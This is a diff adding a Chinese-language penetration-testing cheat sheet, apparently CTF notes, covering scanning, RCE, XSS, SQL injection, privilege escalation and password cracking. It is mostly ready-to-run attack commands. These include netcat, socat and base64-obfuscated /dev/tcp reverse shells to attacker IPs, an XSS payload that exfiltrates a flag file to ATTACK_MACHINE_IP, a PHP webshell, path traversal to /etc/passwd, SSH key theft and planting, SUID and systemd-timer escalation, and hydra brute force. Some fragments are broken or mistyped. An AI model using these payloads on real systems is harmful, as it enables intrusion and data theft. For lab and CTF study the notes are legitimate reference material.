@@ -1,0 +1,450 @@
+信息收集
+端口扫描
+扫描端口 
+
+rustscan
+
+rustscan -a 192.168.1.1 -- -sV -sC
+
+nmap扫描
+
+nmap -p- ip -sC -sV -Pn -T4
+
+目录扫描
+
+gobuster扫描
+
+# 基础扫描：指定目标URL、字典，探测目录
+
+gobuster dir -u http://example.com/ -w /usr/share/wordlists/dirb/common.txt
+
+# 常用参数： # -x：指定文件扩展名（如php,html，探测特定文件）
+
+gobuster dir -u http://example.com/ -w /usr/share/wordlists/dirb/common.txt -x php,html
+
+# -t：线程数（默认10，最大50） gobuster dir -u http://example.com/ -w /usr/share/wordlists/rockyou.txt -t 20
+
+# -k：跳过SSL证书验证（针对HTTPS目标）
+
+gobuster dir -u https://example.com/ -w common.txt -k #
+
+-o：保存结果到文件 gobuster dir -u http://example.com/ -w common.txt -o scan_results.txt
+
+
+
+
+dirsearch扫描
+
+# 基础扫描：指定目标URL，默认字典
+
+python3 dirsearch.py -u http://example.com/
+
+# 常用参数： # -e：指定扩展名（如php,zip）
+
+python3 dirsearch.py -u http://example.com/ -e php,zip
+
+# -w：使用自定义字典
+
+python3 dirsearch.py -u http://example.com/ -w /usr/share/wordlists/dirb/big.txt
+
+# -r：递归扫描（进入子目录后继续扫描）
+
+python3 dirsearch.py -u http://example.com/ -r
+
+# -p：设置代理（如Burp Suite代理）
+
+python3 dirsearch.py -u http://example.com/ -p 127.0.0.1:8080
+
+# --delay：请求延迟（秒，避免被防火墙拦截）
+
+python3 dirsearch.py -u http://example.com/ --delay 1
+
+ffuf
+# 基础扫描：用字典替换URL中的"FUZZ"
+ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
+
+# 常用参数：
+# -e：指定扩展名（如-e .php,.html）
+ffuf -u http://example.com/FUZZ -w common.txt -e .php,.html
+
+# -t：线程数（默认40，最大不限，需谨慎）
+ffuf -u http://example.com/FUZZ -w common.txt -t 50
+
+# -mc：只显示指定状态码的结果（如200,301,403）
+ffuf -u http://example.com/FUZZ -w common.txt -mc 200,301
+
+# -o：保存结果为JSON格式
+ffuf -u http://example.com/FUZZ -w common.txt -o ffuf_results.json
+RCE漏洞利用
+php过滤链进行RCE
+
+
+
+
+<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.72.22 443 >/tmp/f"); ?>' | grep '^php' >
+
+
+
+
+
+
+
+
+
+
+修改shell
+
+1、使用python
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+2、perl
+
+perl -e 'exec "/bin/bash";' # 直接执行bash（简单交互） # 或更完善的伪终端方式
+
+perl -e 'use IO::Pty; my $pty = IO::Pty->new; my $pid = fork; if ($pid) { while (my $line = <$pty>) { print $line; } } else { $pty->make_slave_controlling_terminal; exec "/bin/bash"; }'
+
+3、ruby
+
+ruby -e 'exec "/bin/bash"'  # 直接执行bash
+# 或带伪终端的增强版
+ruby -e 'require "pty"; PTY.spawn("/bin/bash") { |r,w,p| loop { w.puts gets; puts r.gets } }'
+
+4、script
+
+script -qc /bin/bash /dev/null
+
+5、socat
+
+socat file:`tty`,raw,echo=0 tcp-listen:444
+
+发起反向连接
+
+攻击机先监听：socat tcp-listen:4444 stdio
+
+目标机执行：socat tcp:攻击机IP:4444 exec:/bin/bash,pty,stderr,setsid,sigint,sane
+
+6、stty
+
+stty raw -echo && fg
+
+XSS漏洞注入
+
+
+
+
+加载外部文件
+<img src="http://你的外网服务器IP/测试标记">
+
+加载外部脚本并运行
+
+<script src="http://你的外网服务器IP/test.js"></script>
+
+
+
+
+修改路径，并外部访问
+
+</textarea><script>async function a() {const res1 = await fetch('http://127.0.0.1:8080/flag.txt');const b = await res1.text();const res2 = await fetch('http://ATTACK_MACHINE_IP:PORT?a=' + b);}a();</script>
+
+
+
+
+
+
+
+
+
+
+sql注入
+
+1、sql注入手动注入句子
+
+
+
+
+
+
+
+2、sqlmap扫描
+
+sqlmap -u "http://lookup.thm/login.php" --data="username=test&password=test" --method=POST --level=5 --risk=3 --dbs
+
+php反连
+首先使用<?=`$_GET[0]`?>
+
+echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjguMjExLjEvNDQ0NSAwPiYx|base64 -d| bash
+
+利用 PHP 过滤器链进行 RCE
+python3 php_filter_chain_generator.py --chain '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.72.22 443 >/tmp/f"); ?>' | grep '^php' > payload.txt
+
+
+
+
+特殊情况
+数据库登录访问
+
+mysql -u user -p
+
+show databases;
+
+use wordpress;
+
+show tables;
+
+wordpress扫描 
+
+wpscan --url http://www.smol.thm
+
+在当前目录搭建服务器
+
+python3 -m http.server 8080
+
+curl工具使用
+
+curl --path-as-is http://10.201.30.176:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+--path-as-is:保留 URL 中的原始路径，不进行自动规范化处理。
+
+无工具输入
+cat > shell.c << 'EOF'
+printf 'obj-m += shell.o
+
+all:
+	make -C /lib/modules/6.8.0-1030-aws/build M=$(PWD) modules
+
+clean:
+	make -C /lib/modules/6.8.0-1030-aws/build M=$(PWD) clean
+' > Makefile
+
+
+
+
+
+
+
+
+
+
+提权
+使用linpeas
+
+wget linpeas
+
+尝试寻找提权注入点
+
+
+
+
+当前登录用户可以得到的一些权限
+
+1、id
+
+2、查看同组成员
+
+getent group adm
+
+3、查看同组成员文件权限
+
+find / -group adm 2>/dev/null
+
+4、查看当前用户可写的权限
+
+find /  -type f -writable 2>/dev/null | grep -Ev '^(/proc|/snap|/sys|/dev)'
+
+4、查看当前用户可以执行的一些命令
+
+sudo -l
+
+5、寻找所有能够登录的用户
+
+cat /etc/passwd | grep 'sh$'
+
+6、查看当前用户执行命令的shell路径
+
+echo $SHELL
+
+7、临时更换shell环境
+
+1）添加中间层
+
+echo -e '#!/usr/bin/perl\nexec "/bin/sh"' > /dev/shm/test.pl
+chmod +x /dev/shm/test.pl
+
+执行该文件
+
+echo '#!/bin/bash\nchmod +s /bin/bash' > /opt/run_container.sh（重新建立shell的命令）
+
+2）复制shell路径
+
+cp /bin/sh /dev/shm/my_sh
+
+chmod +x /dev/shm/my_sh
+
+
+
+
+
+
+
+
+
+
+
+
+
+查看文件可以发现的一些信息
+
+1、查看可以用户之间的提权关系
+
+cat /etc/pam.d/su
+
+ego：
+
+auth  [success=ignore default=1] pam_succeed_if.so user = gege
+auth  sufficient                 pam_succeed_if.so use_uid user = think
+
+2、查看可执行suid权限的文件
+
+find / -perm /4000 2>/dev/null
+
+3、查看可执行写入权限的文件
+
+find /  -type f -writable 2>/dev/null | grep -Ev 
+
+3、可以查看用户密钥的文件夹
+
+.ssh
+
+可以查看到用户的id_rsa，复制该文件到本地
+
+chmod 600 id_rsa
+
+ssh user@ip-i id_rsa
+
+4、生成公钥和私钥，具备写的权限
+
+ssh-keygen -f id_ed25519 -t ed25519
+
+echo 'id_ed25519_pub'>authorized
+
+ssh -i id_ed25519 comte@ip
+
+
+
+
+
+
+
+
+
+
+
+
+
+5、查看sshd_config ，是否允许密码登录访问
+
+/etc/ssh/sshd_config
+PasswordAuthentication no  # 禁用密码登录
+ChallengeResponseAuthentication no  # 禁用挑战响应认证（类似密码的另一种形式）
+容器
+
+查看容器是否具备CAP_SYS_MODULE能力
+
+capsh --print，可以编写内核模块
+
+特殊文件目录
+
+1、/opt/dev下存在.git文件
+
+2、/var/log查看log文件
+
+3、/var/mail/可以查看mail服务
+
+4、timers.target（systemd 中管理所有定时任务的目标单元）被激活时
+
+5、定时任务
+
+比如/etc/systemd/system/exploit.timer
+
+我们可以修改执行条件
+
+[Unit]
+Description=Exploit Timer
+
+[Timer]
+OnActiveSec=0  # 关键：定时任务启动后立即触发关联服务
+
+[Install]
+WantedBy=timers.target
+
+修改执行的任务内容
+
+comte@cheesectf:~$ cat /etc/systemd/system/exploit.service
+[Unit]
+Description=Exploit Service
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
+
+当我们修改后，执行
+
+加载系统配置
+
+sudo systemctl daemon-reload
+
+开启任务
+
+sudo systemctl start exploit.timer
+
+6、/etc/apparmor.d
+
+查看apparmor的配置文件
+
+
+
+
+MISC
+暴力破解用户密码
+
+1、使用sucrack
+
+2、查看
+
+破解 哈希值
+
+1、识别哈希类型
+
+hashid 5f4dcc3b5aa765d61d8327deb882cf99
+
+2、破解命令
+
+john --wordlist=./rockyou.txt --format=raw-md5 hash.txt
+或者
+hohn hsah.txt --wordlist=./rockyou.txt
+压缩包解密
+
+1、zip2john加密
+
+zip2john wordpress.old.zip > archive_hash
+john archive_hash --wordlist=/usr/share/wordlists/rockyou.txt
+暴力破解
+
+1、hydra
+
+hydra -l jose -P xato-net-10-million-passwords-10000.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=Wrong password. Please try again." -t 64
+
+解码得到16进制数据
+
+echo "hJg8YPfarcHLhphiH4AsDZ+aPDwpXIEHSPsEgRXBhuw=" | base64 -d | xxd -p
+
+
+
+
+
+
+
+
